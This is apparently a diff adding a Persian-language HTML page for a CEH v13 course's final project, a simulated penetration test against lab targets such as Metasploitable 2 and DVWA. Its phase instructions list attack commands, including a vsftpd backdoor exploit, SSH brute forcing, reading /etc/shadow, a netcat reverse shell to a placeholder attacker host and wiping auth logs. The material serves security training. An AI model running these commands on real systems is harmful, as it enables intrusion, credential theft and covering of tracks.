@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پروژه نهایی - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        /* ===== استایل‌های اختصاصی ===== */
+        .project-overview {
+            background: linear-gradient(135deg, var(--primary-light, #eef2ff), rgba(124, 58, 237, 0.08));
+            border-radius: var(--radius-sm);
+            padding: 24px 28px;
+            border-right: 5px solid var(--primary);
+            margin: 16px 0;
+        }
+        body.dark-mode .project-overview {
+            background: rgba(30, 41, 59, 0.6);
+        }
+
+        .phase-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .phase-card {
+            background: var(--card-bg, rgba(255, 255, 255, 0.7));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid var(--card-border, rgba(255, 255, 255, 0.3));
+            border-radius: var(--radius-sm, 14px);
+            padding: 18px 20px;
+            box-shadow: var(--shadow-sm, 0 2px 8px rgba(0, 0, 0, 0.04));
+            transition: var(--transition, all 0.35s cubic-bezier(0.4, 0, 0.2, 1));
+            border-right: 4px solid var(--primary, #4f46e5);
+        }
+        .phase-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-md, 0 12px 40px -8px rgba(0, 0, 0, 0.08));
+        }
+        body.dark-mode .phase-card {
+            background: rgba(30, 41, 59, 0.7);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+        .phase-card .phase-icon {
+            font-size: 1.8rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .phase-card .phase-num {
+            font-weight: 700;
+            color: var(--primary);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .phase-card h4 {
+            margin: 4px 0 6px 0;
+            font-size: 1.1rem;
+            border-bottom: none;
+        }
+        .phase-card p {
+            font-size: 0.9rem;
+            color: var(--text-secondary, #334155);
+            margin: 0;
+            line-height: 1.6;
+        }
+        .phase-card .tools {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 10px;
+        }
+        .phase-card .tools .tool-tag {
+            font-size: 0.6rem;
+            padding: 2px 10px;
+            border-radius: var(--radius-full, 9999px);
+            background: var(--primary-light, #eef2ff);
+            color: var(--primary-dark, #1e1b4b);
+            border: 1px solid rgba(79, 70, 229, 0.1);
+            font-weight: 600;
+        }
+        body.dark-mode .phase-card .tools .tool-tag {
+            background: #1e293b;
+            color: #818cf8;
+            border-color: rgba(129, 140, 248, 0.15);
+        }
+
+        .report-template {
+            background: var(--card-bg, rgba(255, 255, 255, 0.6));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid var(--card-border, rgba(255, 255, 255, 0.3));
+            border-radius: var(--radius-sm);
+            padding: 20px 24px;
+            margin: 16px 0;
+        }
+        body.dark-mode .report-template {
+            background: rgba(30, 41, 59, 0.6);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+        .report-template ul {
+            padding-right: 20px;
+            margin: 6px 0;
+        }
+        .report-template ul li {
+            margin: 4px 0;
+        }
+
+        .criteria-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 16px;
+            margin: 16px 0;
+        }
+        .criteria-item {
+            background: var(--card-bg, rgba(255, 255, 255, 0.4));
+            backdrop-filter: blur(8px);
+            border-radius: var(--radius-sm);
+            padding: 14px 18px;
+            text-align: center;
+            border: 1px solid var(--card-border, rgba(255, 255, 255, 0.2));
+        }
+        body.dark-mode .criteria-item {
+            background: rgba(30, 41, 59, 0.4);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+        .criteria-item .percent {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary);
+            display: block;
+        }
+        .criteria-item .label {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        .timeline-table td {
+            padding: 10px 16px;
+        }
+        .timeline-table .week-cell {
+            font-weight: 700;
+            color: var(--primary);
+            white-space: nowrap;
+        }
+
+        .resources-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 12px;
+            margin: 12px 0;
+        }
+        .resources-list .res-item {
+            background: var(--card-bg, rgba(255, 255, 255, 0.3));
+            backdrop-filter: blur(6px);
+            border-radius: var(--radius-sm);
+            padding: 12px 16px;
+            border-right: 3px solid var(--primary);
+            border: 1px solid var(--card-border, rgba(255, 255, 255, 0.15));
+        }
+        body.dark-mode .resources-list .res-item {
+            background: rgba(30, 41, 59, 0.3);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+        .resources-list .res-item .res-icon {
+            font-size: 1.2rem;
+            margin-left: 6px;
+        }
+
+        .deliverable-box {
+            background: var(--card-bg, rgba(255, 255, 255, 0.5));
+            backdrop-filter: blur(8px);
+            border-radius: var(--radius-sm);
+            padding: 16px 20px;
+            border-right: 4px solid var(--accent-green, #10b981);
+            border: 1px solid var(--card-border, rgba(255, 255, 255, 0.2));
+            margin: 12px 0;
+        }
+        body.dark-mode .deliverable-box {
+            background: rgba(30, 41, 59, 0.5);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+
+        @media (max-width: 768px) {
+            .phase-grid {
+                grid-template-columns: 1fr;
+            }
+            .criteria-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+            .resources-list {
+                grid-template-columns: 1fr;
+            }
+        }
+        @media (max-width: 480px) {
+            .criteria-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../index.html">خانه</a> |
+            <a href="../index.html">ارزیابی</a>
+        </span>
+    </div>
+
+    <h1>🎓 پروژه نهایی – تست نفوذ جامع سازمانی</h1>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: معرفی پروژه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔰 معرفی پروژه</h2>
+        <p>
+            پروژهٔ نهایی دورهٔ CEH V13 یک <b>سناریوی کامل تست نفوذ</b> در یک سازمان فرضی است که تمام مراحل هک قانونمند را از ابتدا تا انتها پوشش می‌دهد. این پروژه به‌گونه‌ای طراحی شده که دقیقاً شبیه به یک مأموریت واقعی در یک سازمان با زیرساخت‌های متنوع باشد.
+        </p>
+
+        <div class="project-overview">
+            <h3 style="margin-top: 0; border-bottom: none; color: var(--text-primary);">🏢 سازمان فرضی: «شرکت فناوری‌های آتی»</h3>
+            <ul style="margin: 8px 0 0 0;">
+                <li><b>صنعت:</b> فناوری اطلاعات و خدمات ابری</li>
+                <li><b>تعداد کارکنان:</b> ۱۵۰ نفر</li>
+                <li><b>زیرساخت:</b> شبکه داخلی با ۳ زیرشبکه (مدیریت، کارکنان، مهمان)</li>
+                <li><b>سرویس‌های عمومی:</b> وب‌سایت سازمانی (Apache + MySQL)، پورتال مشتریان (Tomcat)، ایمیل سرور (Postfix)</li>
+                <li><b>سیستم‌عامل‌ها:</b> سرورهای لینوکس (Ubuntu 20.04) و کلاینت‌های ویندوز (Windows 10)</li>
+                <li><b>محیط هدف:</b> Metasploitable 2 + Windows 10 + یک وب‌سایت سفارشی آسیب‌پذیر (DVWA)</li>
+            </ul>
+        </div>
+
+        <div class="highlight-box" style="margin-top: 12px;">
+            <b>🎯 اهداف پروژه:</b>
+            <ol>
+                <li>جمع‌آوری اطلاعات از سازمان هدف (Footprinting & OSINT)</li>
+                <li>اسکن و شناسایی سرویس‌های فعال و آسیب‌پذیری‌ها</li>
+                <li>بهره‌برداری از حداقل ۳ آسیب‌پذیری مختلف</li>
+                <li>افزایش دسترسی و نفوذ به بخش‌های داخلی شبکه</li>
+                <li>مستندسازی کامل تمام مراحل در قالب یک گزارش حرفه‌ای</li>
+            </ol>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: فازهای پروژه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📋 فازهای ۵‌گانه پروژه</h2>
+        <p>
+            پروژه به <b>۵ فاز اصلی</b> تقسیم شده که هر کدام یکی از مراحل استاندارد تست نفوذ را پوشش می‌دهند. هر فاز شامل اهداف مشخص، ابزارهای پیشنهادی و خروجی‌های مورد انتظار است.
+        </p>
+
+        <div class="phase-grid">
+
+            <div class="phase-card">
+                <span class="phase-icon">🔍</span>
+                <span class="phase-num">فاز ۱</span>
+                <h4>شناسایی (Reconnaissance)</h4>
+                <p>
+                    جمع‌آوری اطلاعات عمومی از سازمان، شامل دامنه‌ها، IPها، اطلاعات کارکنان، فناوری‌های استفاده‌شده و زیردامنه‌ها.
+                </p>
+                <div class="tools">
+                    <span class="tool-tag">theHarvester</span>
+                    <span class="tool-tag">whois</span>
+                    <span class="tool-tag">dig</span>
+                    <span class="tool-tag">Shodan</span>
+                    <span class="tool-tag">Google Dorking</span>
+                </div>
+            </div>
+
+            <div class="phase-card">
+                <span class="phase-icon">📡</span>
+                <span class="phase-num">فاز ۲</span>
+                <h4>اسکن و شمارش</h4>
+                <p>
+                    اسکن شبکه، شناسایی میزبان‌های زنده، پورت‌های باز، سرویس‌های در حال اجرا، سیستم‌عامل و نسخه‌ها.
+                </p>
+                <div class="tools">
+                    <span class="tool-tag">Nmap</span>
+                    <span class="tool-tag">Netcat</span>
+                    <span class="tool-tag">enum4linux</span>
+                    <span class="tool-tag">smbclient</span>
+                </div>
+            </div>
+
+            <div class="phase-card">
+                <span class="phase-icon">⚡</span>
+                <span class="phase-num">فاز ۳</span>
+                <h4>بهره‌برداری</h4>
+                <p>
+                    شناسایی آسیب‌پذیری‌های بحرانی و نفوذ به سیستم‌های هدف با استفاده از Exploitهای مناسب.
+                </p>
+                <div class="tools">
+                    <span class="tool-tag">Metasploit</span>
+                    <span class="tool-tag">SQLmap</span>
+                    <span class="tool-tag">Hydra</span>
+                    <span class="tool-tag">Burp Suite</span>
+                </div>
+            </div>
+
+            <div class="phase-card">
+                <span class="phase-icon">🔐</span>
+                <span class="phase-num">فاز ۴</span>
+                <h4>پس از نفوذ</h4>
+                <p>
+                    افزایش دسترسی (Privilege Escalation)، حفظ دسترسی (Backdoor)، جمع‌آوری اطلاعات و پاک کردن ردپا.
+                </p>
+                <div class="tools">
+                    <span class="tool-tag">Meterpreter</span>
+                    <span class="tool-tag">Netcat</span>
+                    <span class="tool-tag">John the Ripper</span>
+                    <span class="tool-tag">LinPEAS</span>
+                </div>
+            </div>
+
+            <div class="phase-card">
+                <span class="phase-icon">📄</span>
+                <span class="phase-num">فاز ۵</span>
+                <h4>گزارش‌نویسی</h4>
+                <p>
+                    تهیهٔ یک گزارش جامع و حرفه‌ای شامل تمام یافته‌ها، آسیب‌پذیری‌ها، شواهد، تحلیل ریسک و راهکارهای پیشنهادی.
+                </p>
+                <div class="tools">
+                    <span class="tool-tag">Markdown</span>
+                    <span class="tool-tag">LaTeX</span>
+                    <span class="tool-tag">Word</span>
+                    <span class="tool-tag">Dradis</span>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="tip-box" style="margin-top: 12px;">
+            <b>💡 نکته:</b> برای هر فاز، حتماً خروجی‌ها (اسکرین‌شات، لاگ‌ها، دستورات) را ذخیره کنید تا در گزارش نهایی استفاده شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: دستورالعمل گام‌به‌گام فازها -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📌 دستورالعمل گام‌به‌گام هر فاز</h2>
+
+        <!-- فاز ۱ -->
+        <h3 style="margin-top: 24px;">🔍 فاز ۱: شناسایی (Reconnaissance)</h3>
+        <div style="background: var(--card-bg, rgba(255,255,255,0.4)); backdrop-filter: blur(8px); border-radius: var(--radius-sm); padding: 16px 20px; border-right: 3px solid var(--primary); margin-bottom: 16px;">
+            <ul>
+                <li><b>گام ۱:</b> جمع‌آوری اطلاعات دامنه با <code dir='ltr'>whois example.com</code> و <code dir='ltr'>dig example.com ANY</code></li>
+                <li><b>گام ۲:</b> جستجوی ایمیل‌ها با <code dir='ltr'>theHarvester -d example.com -l 500 -b google,linkedin</code></li>
+                <li><b>گام ۳:</b> جستجوی زیردامنه‌ها با <code dir='ltr'>dnsrecon -d example.com -t std</code></li>
+                <li><b>گام ۴:</b> جستجوی اطلاعات عمومی در شبکه‌های اجتماعی و گوگل (Google Dorking)</li>
+                <li><b>گام ۵:</b> جستجوی دستگاه‌های متصل با Shodan: <code dir='ltr'>shodan search org:"example"</code></li>
+                <li><b>خروجی مورد انتظار:</b> لیست دامنه‌ها، زیردامنه‌ها، IPها، ایمیل‌ها و اطلاعات تماس</li>
+            </ul>
+        </div>
+
+        <!-- فاز ۲ -->
+        <h3 style="margin-top: 20px;">📡 فاز ۲: اسکن و شمارش</h3>
+        <div style="background: var(--card-bg, rgba(255,255,255,0.4)); backdrop-filter: blur(8px); border-radius: var(--radius-sm); padding: 16px 20px; border-right: 3px solid #3b82f6; margin-bottom: 16px;">
+            <ul>
+                <li><b>گام ۱:</b> Ping Sweep برای شناسایی میزبان‌های زنده: <code dir='ltr'>nmap -sn 192.168.1.0/24</code></li>
+                <li><b>گام ۲:</b> اسکن پورت‌های باز: <code dir='ltr'>nmap -sS -p- 192.168.1.101</code></li>
+                <li><b>گام ۳:</b> تشخیص نسخه سرویس‌ها: <code dir='ltr'>nmap -sV -p 21,22,80,443,445,3306 192.168.1.101</code></li>
+                <li><b>گام ۴:</b> شمارش SMB: <code dir='ltr'>enum4linux -a 192.168.1.101</code></li>
+                <li><b>گام ۵:</b> شمارش SNMP: <code dir='ltr'>snmpwalk -v 1 -c public 192.168.1.101 system</code></li>
+                <li><b>خروجی مورد انتظار:</b> لیست کامل پورت‌های باز، سرویس‌ها، نسخه‌ها و کاربران شناسایی‌شده</li>
+            </ul>
+        </div>
+
+        <!-- فاز ۳ -->
+        <h3 style="margin-top: 20px;">⚡ فاز ۳: بهره‌برداری</h3>
+        <div style="background: var(--card-bg, rgba(255,255,255,0.4)); backdrop-filter: blur(8px); border-radius: var(--radius-sm); padding: 16px 20px; border-right: 3px solid #ef4444; margin-bottom: 16px;">
+            <ul>
+                <li><b>گام ۱:</b> بهره‌برداری از vsftpd 2.3.4 (Metasploitable): <code dir='ltr'>use exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+                <li><b>گام ۲:</b> SQL Injection در DVWA: <code dir='ltr'>sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1" --cookie="..." --dbs</code></li>
+                <li><b>گام ۳:</b> Brute-Force SSH با Hydra: <code dir='ltr'>hydra -l msfadmin -P rockyou.txt ssh://192.168.1.101</code></li>
+                <li><b>گام ۴:</b> بهره‌برداری از EternalBlue (در صورت وجود ویندوز هدف)</li>
+                <li><b>خروجی مورد انتظار:</b> دسترسی موفق به حداقل ۲ سیستم با شل یا Meterpreter</li>
+            </ul>
+        </div>
+
+        <!-- فاز ۴ -->
+        <h3 style="margin-top: 20px;">🔐 فاز ۴: پس از نفوذ</h3>
+        <div style="background: var(--card-bg, rgba(255,255,255,0.4)); backdrop-filter: blur(8px); border-radius: var(--radius-sm); padding: 16px 20px; border-right: 3px solid #8e44ad; margin-bottom: 16px;">
+            <ul>
+                <li><b>گام ۱:</b> افزایش دسترسی با <code dir='ltr'>sudo -l</code> و <code dir='ltr'>sudo su -</code> (اگر sudoers باشد)</li>
+                <li><b>گام ۲:</b> استخراج هش‌های پسورد: <code dir='ltr'>cat /etc/shadow</code> و کرک با John</li>
+                <li><b>گام ۳:</b> ایجاد درب پشتی با شل معکوس: <code dir='ltr'>nc -e /bin/bash attacker_ip 4444</code></li>
+                <li><b>گام ۴:</b> پاک کردن لاگ‌ها: <code dir='ltr'>echo "" > /var/log/auth.log</code> و <code dir='ltr'>history -c</code></li>
+                <li><b>خروجی مورد انتظار:</b> دسترسی root، رمزهای کرک‌شده، درب پشتی فعال، ردپای پاک‌شده</li>
+            </ul>
+        </div>
+
+        <!-- فاز ۵ -->
+        <h3 style="margin-top: 20px;">📄 فاز ۵: گزارش‌نویسی</h3>
+        <div style="background: var(--card-bg, rgba(255,255,255,0.4)); backdrop-filter: blur(8px); border-radius: var(--radius-sm); padding: 16px 20px; border-right: 3px solid #10b981; margin-bottom: 16px;">
+            <ul>
+                <li><b>گام ۱:</b> جمع‌آوری تمام خروجی‌ها و اسکرین‌شات‌های هر فاز</li>
+                <li><b>گام ۲:</b> تدوین گزارش با ساختار استاندارد (چکیده، مقدمه، روش‌شناسی، یافته‌ها، نتیجه‌گیری)</li>
+                <li><b>گام ۳:</b> اولویت‌بندی آسیب‌پذیری‌ها با CVSS</li>
+                <li><b>گام ۴:</b> ارائه راهکارهای رفع برای هر آسیب‌پذیری</li>
+                <li><b>گام ۵:</b> ویرایش نهایی و تحویل گزارش به‌صورت PDF</li>
+                <li><b>خروجی مورد انتظار:</b> یک گزارش کامل و حرفه‌ای (۱۵-۲۰ صفحه)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: الگوی گزارش -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📄 الگوی گزارش حرفه‌ای</h2>
+        <p>
+            گزارش نهایی باید بر اساس ساختار استاندارد زیر تهیه شود. این الگو مطابق با بهترین روش‌های گزارش‌نویسی در تست نفوذ است.
+        </p>
+
+        <div class="report-template">
+            <h3 style="margin-top: 0; border-bottom: none;">📋 ساختار گزارش</h3>
+            <ol>
+                <li><b>صفحه عنوان:</b> نام پروژه، نام سازمان، تاریخ، نام تست‌کننده</li>
+                <li><b>چکیده اجرایی (Executive Summary):</b> خلاصهٔ یافته‌ها برای مدیران غیرفنی (۱-۲ صفحه)</li>
+                <li><b>مقدمه:</b> هدف، محدوده، روش‌شناسی، ابزارها و مجوزها</li>
+                <li><b>روش‌شناسی:</b> توضیح مراحل تست نفوذ (۵ فاز)</li>
+                <li><b>یافته‌ها (Findings):</b>
+                    <ul>
+                        <li>هر آسیب‌پذیری با: عنوان، سطح خطر (CVSS)، توضیح، شواهد (اسکرین‌شات/کد)، تأثیر، توصیه</li>
+                        <li>آسیب‌پذیری‌های بحرانی (Critical) و بالا (High) در اولویت</li>
+                    </ul>
+                </li>
+                <li><b>تحلیل کلی:</b> ارزیابی کلی وضعیت امنیت سازمان</li>
+                <li><b>توصیه‌های استراتژیک:</b> راهکارهای بلندمدت برای بهبود امنیت</li>
+                <li><b>نتیجه‌گیری:</b> جمع‌بندی نهایی و گام‌های بعدی</li>
+                <li><b>پیوست‌ها:</b> خروجی‌های کامل ابزارها، لاگ‌ها و کدهای بهره‌برداری</li>
+            </ol>
+        </div>
+
+        <div class="deliverable-box">
+            <b>📌 فرمت تحویل:</b>
+            <ul style="margin: 6px 0 0 0;">
+                <li><b>فرمت فایل:</b> PDF (با قابلیت جستجو)</li>
+                <li><b>حجم:</b> ۱۵-۲۰ صفحه (بدون پیوست‌ها)</li>
+                <li><b>زبان:</b> فارسی (با اصطلاحات تخصصی انگلیسی در صورت لزوم)</li>
+                <li><b>نام فایل:</b> <code dir='ltr'>CEH_Final_Project_[نام_شما].pdf</code></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: معیارهای ارزیابی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📊 معیارهای ارزیابی پروژه</h2>
+        <p>
+            پروژه بر اساس ۴ معیار اصلی ارزیابی می‌شود. برای قبولی، باید حداقل <b>۷۰٪</b> از امتیاز کل را کسب کنید.
+        </p>
+
+        <div class="criteria-grid">
+            <div class="criteria-item">
+                <span class="percent">۴۰٪</span>
+                <span class="label">دقت و کامل بودن اجرا</span>
+            </div>
+            <div class="criteria-item">
+                <span class="percent">۳۰٪</span>
+                <span class="label">کیفیت مستندسازی و گزارش</span>
+            </div>
+            <div class="criteria-item">
+                <span class="percent">۲۰٪</span>
+                <span class="label">تحلیل و درک آسیب‌پذیری‌ها</span>
+            </div>
+            <div class="criteria-item">
+                <span class="percent">۱۰٪</span>
+                <span class="label">خلاقیت و تکنیک‌های پیشرفته</span>
+            </div>
+        </div>
+
+        <h3>📌 جزئیات هر معیار:</h3>
+        <ul>
+            <li><b>دقت و کامل بودن (۴۰٪):</b> اجرای صحیح تمام ۵ فاز، استفاده از ابزارهای مناسب، دستیابی به اهداف پروژه</li>
+            <li><b>کیفیت مستندسازی (۳۰٪):</b> شفافیت گزارش، اسکرین‌شات‌های باکیفیت، توضیحات دقیق، ساختار منظم</li>
+            <li><b>تحلیل آسیب‌پذیری‌ها (۲۰٪):</b> درک عمیق از آسیب‌پذیری‌ها، اولویت‌بندی صحیح، توصیه‌های عملی</li>
+            <li><b>خلاقیت (۱۰٪):</b> استفاده از تکنیک‌های پیشرفته، رویکردهای نوآورانه، ترکیب چندین روش</li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: جدول زمانی پیشنهادی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>⏰ جدول زمانی پیشنهادی</h2>
+        <p>
+            برای مدیریت بهتر زمان، برنامهٔ زیر را به‌عنوان راهنمای انجام پروژه در نظر بگیرید:
+        </p>
+
+        <div class="table-responsive">
+            <table class="timeline-table">
+                <tr><th>هفته</th><th>فاز</th><th>فعالیت‌ها</th></tr>
+                <tr>
+                    <td class="week-cell">هفته ۱</td>
+                    <td>فاز ۱: شناسایی</td>
+                    <td>جمع‌آوری اطلاعات، OSINT، Google Dorking، WHOIS، DNS</td>
+                </tr>
+                <tr>
+                    <td class="week-cell">هفته ۲</td>
+                    <td>فاز ۲: اسکن و شمارش</td>
+                    <td>اسکن با Nmap، Enumeration با enum4linux، SNMP، SMB</td>
+                </tr>
+                <tr>
+                    <td class="week-cell">هفته ۳</td>
+                    <td>فاز ۳: بهره‌برداری</td>
+                    <td>اجرای Exploitها، SQL Injection، Brute-Force، Metasploit</td>
+                </tr>
+                <tr>
+                    <td class="week-cell">هفته ۴</td>
+                    <td>فاز ۴: پس از نفوذ</td>
+                    <td>افزایش دسترسی، ایجاد Backdoor، پاک کردن ردپا</td>
+                </tr>
+                <tr>
+                    <td class="week-cell">هفته ۵</td>
+                    <td>فاز ۵: گزارش‌نویسی</td>
+                    <td>جمع‌آوری مستندات، تدوین گزارش، ویرایش نهایی</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="tip-box" style="margin-top: 12px;">
+            <b>💡 نکته:</b> در صورت امکان، فازهای ۱ تا ۴ را همزمان با پیشرفت دوره انجام دهید تا در هفته‌های پایانی فقط به گزارش‌نویسی بپردازید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: منابع و ابزارهای مورد نیاز -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🛠️ منابع و ابزارهای مورد نیاز</h2>
+
+        <div class="resources-list">
+            <div class="res-item"><span class="res-icon">🖥️</span> Kali Linux (ماشین مهاجم)</div>
+            <div class="res-item"><span class="res-icon">🎯</span> Metasploitable 2 (هدف لینوکس)</div>
+            <div class="res-item"><span class="res-icon">🪟</span> Windows 10 (هدف ویندوز)</div>
+            <div class="res-item"><span class="res-icon">🌐</span> DVWA (برنامه وب آسیب‌پذیر)</div>
+            <div class="res-item"><span class="res-icon">📡</span> Nmap, Wireshark, Burp Suite</div>
+            <div class="res-item"><span class="res-icon">⚡</span> Metasploit, SQLmap, Hydra</div>
+            <div class="res-item"><span class="res-icon">🔑</span> John the Ripper, Hashcat</div>
+            <div class="res-item"><span class="res-icon">📄</span> Word/LaTeX/Markdown برای گزارش</div>
+        </div>
+
+        <div class="highlight-box" style="margin-top: 12px;">
+            <b>📌 لینک‌های مفید برای پروژه:</b>
+            <ul>
+                <li><a href="https://www.vulnhub.com/" target="_blank" style="color:var(--primary);">VulnHub</a> – دانلود ماشین‌های آسیب‌پذیر</li>
+                <li><a href="https://exploit-db.com/" target="_blank" style="color:var(--primary);">Exploit-DB</a> – جستجوی Exploit</li>
+                <li><a href="https://gtfobins.github.io/" target="_blank" style="color:var(--primary);">GTFOBins</a> – افزایش دسترسی در لینوکس</li>
+                <li><a href="https://lolbas-project.github.io/" target="_blank" style="color:var(--primary);">LOLBAS</a> – افزایش دسترسی در ویندوز</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی پروژه</h2>
+        <div class="table-responsive">
+            <table>
+                <tr><th style="min-width:140px;">واژه</th><th>توضیح</th></tr>
+                <tr>
+                    <td><span class="glossary-term">Pentest</span></td>
+                    <td>تست نفوذ – شبیه‌سازی حملات واقعی برای ارزیابی امنیت سیستم‌ها.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Reconnaissance</span></td>
+                    <td>مرحلهٔ شناسایی و جمع‌آوری اطلاعات از هدف قبل از هرگونه حمله.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Exploit</span></td>
+                    <td>کد یا تکنیکی که از یک آسیب‌پذیری برای نفوذ به سیستم استفاده می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Privilege Escalation</span></td>
+                    <td>افزایش سطح دسترسی از کاربر عادی به مدیر (root/admin).</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Backdoor</span></td>
+                    <td>یک راه مخفی برای دسترسی مجدد به سیستم پس از نفوذ.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">CVSS</span></td>
+                    <td>سیستم امتیازدهی شدت آسیب‌پذیری‌ها (۰ تا ۱۰).</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">OSINT</span></td>
+                    <td>جمع‌آوری اطلاعات از منابع عمومی و باز.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Report</span></td>
+                    <td>گزارش مستند و حرفه‌ای از یافته‌ها، آسیب‌پذیری‌ها و راهکارهای پیشنهادی.</td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی نهایی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>📌 جمع‌بندی و گام بعدی:</b>
+        <ul>
+            <li>پروژه را به‌صورت گام‌به‌گام و با رعایت ترتیب فازها انجام دهید.</li>
+            <li>تمام خروجی‌ها و اسکرین‌شات‌ها را برای گزارش نهایی ذخیره کنید.</li>
+            <li>گزارش را با الگوی ارائه‌شده و با رعایت اصول حرفه‌ای تهیه کنید.</li>
+            <li>پس از اتمام، گزارش را به‌صورت PDF تحویل دهید.</li>
+        </ul>
+        <p style="margin-top:12px;">
+            <b>🚀 این پروژه، شبیه‌سازی واقعی یک مأموریت تست نفوذ است. با دقت و حوصله آن را انجام دهید تا آمادگی کامل برای آزمون CEH Practical پیدا کنید.</b>
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">پروژه نهایی | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+</body>
+</html>
